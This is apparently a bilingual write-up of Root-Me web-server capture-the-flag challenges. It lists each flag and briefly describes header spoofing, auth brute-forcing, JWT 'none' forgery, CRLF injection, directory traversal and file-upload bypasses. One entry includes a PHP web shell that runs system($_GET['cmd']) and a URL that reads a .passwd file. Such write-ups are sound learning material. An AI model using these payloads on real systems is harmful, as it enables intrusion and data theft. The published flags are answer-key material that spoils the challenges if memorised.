# 1. HTML - Source code
pass: nZ^&@q5&sjJHev0
# 2. HTTP - IP restriction bypass
use **X-Forwarded-For header** to trick server with internal ip addr

pass: Ip_$po0Fing
# 3. HTTP - Open redirect
go to another page than the other which are displayed in the source code

pass: e6f8a530811d5a479812d7b82fc1a5c5
# 4. HTTP - User-agent
As the title, Change **User-Agent** to admin

pass: rr$Li9%L34qd1AAe27
# 5. Weak password
This is kinda guessy challenge, but i dont wanna guess so i decide to **BRUTE** it ^^

First capture the header and the boday with **burp**

![image info](img/271810551_242364731407511_8256775808442882487_n.png)

So the payload that we request to web page is convert to base64 and place in the Authorization header

**(The HTTP Authorization request header can be used to provide credentials that authenticate a user agent with a server, allowing access to a protected resource.)** 

so i write a script to convert default credentials to base64 and use FFUF to brute force (script in the folder)

![image info](img/271719231_990489488219350_4169317159863269556_n.png)

pass:admin 

(I think if I guess the credentials, maybe I'll finish sooner :v)

# 5. PHP - Command injection
pass: S3rv1ceP1n9Sup3rS3cure
# 6. Backup file
Content discovery (use dirsearch)

pass: OCCY9AcNm1tj
# 7. HTTP - Directory indexing
Content discovery 

pass: Linux
# 8. HTTP - Headers
change the header (script in folder)

pass: HeadersMayBeUseful
# 9. HTTP - POST
As the title, use request method:POST to send data (script in folder)

pass: H7tp_h4s_N0_s3Cr37S_F0r_y0U

# 10. HTTP - Improper redirect
The web page is automatically add redirect param to the url because of the Location header

```
http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect
```

**The Location response header indicates the URL to redirect a page to. It only provides a meaning when served with a 3xx (redirection) or 201 (created) status response.)**

Solution: add 
```
allow_redirects=False
```
to the request (script in the folder)

pass: ExecutionAfterRedirectIsBad

# 11. HTTP - Verb tampering
My first idea is tried the script and the payload i had done earlier chall but no working, so i have to rethink about this chall. i note that the title is **Verb tampering** so the ideal here is change the request method to anything other than GET.

pass: ```a23e$dme96d3saez$$prap```

# 12. Install files
According to the title, the admin of this page uses phpbb (i dont know what it is) and he forget to delete his install folder, so the idea this to find it

Location: **/phpbb/install/**

pass: karambar

# 13. CRLF
(Carriage return and Line Feed) it means to create new lines (\r\n).
So the idea is to use intercept proxy (e.g. Burp suite) edit request to
```
GET /web-serveur/ch14/?username=%0D%0Aadmin%20authenticated%0D%0INJECTINHERE
```
# 14. File upload - Double extensions
The idea is upload our script and rce. 
(i have tried reverse shell with netcat and ngrok to port fowarding but somehow it didnt work LOL so i use this script from another write up)
```
<?php

$data = system($_GET["cmd"]);
echo $data;

?>
```
now change this to reverse.php.png to bypass the image filter and the final step is rce with cmd param
```
challenge01.root-me.org/web-serveur/ch20/galerie/upload/0c3f5ea659f03569d6fce99cf1233c56/test.php.png?cmd=cat%20../../../.passwd
```
pass: Gg9LRz-hWSxqqUKd77-_q-6G8

# 15. File upload - MIME type
(Kiểu phương tiện là định danh hai phần cho định dạng file và nội dung định dạng được truyền trên Internet.)

So idea here is use Burp to change the header **Content-type** from  from **aplication/octet-stream** to **image/png**. Ok now we can upload our script successfully

pass: a7n4nizpgQgnPERy89uanf6T4

# 16. HTTP - Cookies
Use burp to catch request and change the cookie from **visiteur** to **admin**

pass: ml-SYMPA 
# 17. Insecure Code Management
(use Gittools)

pass: s3cureP@ssw0rd

# 18. JSON Web Token (JWT) - Introduction
first, let's capture the request and respone with burp

![image info](img/248008306_329979162475483_3939972177496919035_n.png)

So as the title, the idea here is to change the jwt token to bypass this page. Let's use jwt.io ([here](https://jwt.io/)) to decode this jwt token.

![image info](img/271772730_708851527148236_2564623737749867392_n.png)

So we can change the algorithm from **HS256** to **none** and delete the signature key at the end (because **none** alg doesnt need that key). After doing that, we encode that token to base64 and send it to get the password

pass: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7



# ------------- TIENG VIET ---------------
# 19. Directory traversal
Xin phép qua tiếng việt viết cho nhanh chứ làm quả 7 mấy chall tiếng anh thì đến già ms xong mất :( (với cả mình nghĩ đến tầm chall này trở đi cũng bắt đầu cần động não rùi)


Cái title đã gợi ý lỗ hổng cho rùi, mình sẽ dùng param galerie để khai thác lỗ hổng, thử enumerate bằng payload này: "**.**" xem sao 

```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.
```

![img](img/Screenshot%20from%202022-02-07%2019-31-42.png)

Yeh và nó đã liệt kê hết các dict trong dict galerie, trong đó có thư mục 86hwnX2r là cần lưu ý, giờ chui vào thoi, làm cũng tuơng tự như trên

```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.
```

![img](img/Screenshot%20from%202022-02-07%2019-36-59.png)

yay và cuối cùng truy cập lấy flag thôi

flag: kcb$!Bx@v4Gs9Ez
# 20. File upload - Null byte
Upload thử đoạn script từ chall 14 với png filter xem ntn

![img](img/Screenshot%20from%202022-02-07%2019-53-29.png) 

Tận dụng hint từ title, mình sẽ thêm cái Null byte vào cuối để bypass filter, mình sẽ thử đặt nó ở vài chỗ như:

* 1 upload%00.php.png
* 2 upload.php%00.png
* 3 upload.php.png%00

(À mình đặt bằng cách dùng burp chặn post request và thêm ở đấy  )

![img](img/Screenshot%20from%202022-02-07%2019-59-34.png)

và có vẻ là cái thứ 2 đã upload thành công

![img](img/Screenshot%20from%202022-02-07%2020-00-07.png)

Giờ truy cập vào file upload đấy và rce qua param cmd thôi

flag: YPNchi2NmTwygr2dgCCF 
